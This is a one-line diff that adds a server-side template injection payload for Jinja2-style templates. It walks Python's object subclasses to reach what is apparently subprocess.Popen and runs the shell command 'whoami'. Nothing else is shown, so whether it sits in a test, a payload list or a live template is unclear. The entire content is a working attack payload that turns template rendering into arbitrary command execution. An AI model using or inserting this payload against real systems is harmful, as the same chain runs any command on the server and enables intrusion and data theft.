@@ -1,0 +1,1 @@
+{{ ''.__class__.__mro__[1].__subclasses__()[571]('whoami', shell=True, stdout=-1).communicate()[0].decode() }}
